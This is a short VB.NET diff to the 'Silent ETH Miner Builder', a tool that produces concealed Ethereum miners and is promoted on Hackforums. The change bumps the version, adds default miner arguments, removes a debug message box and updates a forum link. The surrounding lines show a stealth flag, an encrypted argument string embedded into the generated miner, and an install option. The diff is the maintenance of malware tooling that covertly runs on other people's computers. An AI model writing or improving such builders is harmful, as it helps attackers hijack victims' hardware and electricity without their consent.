@@ -4,7 +4,7 @@ Imports System.Text
 
 Public Class Form1
     Public Shared rand As New Random()
-    Public advancedParams As String = ""
+    Public advancedParams As String = " --response-timeout=30 --farm-retries=30 "
     Public watchdogdata As Byte() = New Byte() {}
 
     'Silent ETH Miner by Unam Sanctam https://github.com/UnamSanctam/SilentETHMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
@@ -20,7 +20,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent ETH Miner Builder 1.0"
+            MephForm1.Text = "Silent ETH Miner Builder 1.0.1"
         Catch ex As Exception
         End Try
 
@@ -105,7 +105,6 @@ Public Class Form1
                 argstr += " --unam-stealth "
             End If
 
-            MessageBox.Show(argstr)
             minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
 
             If chkInstall.Checked Then
@@ -392,7 +391,7 @@ Public Class Form1
     End Sub
 
     Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
-        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
+        Process.Start("https://hackforums.net/showthread.php?tid=6145468")
     End Sub
 
     Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
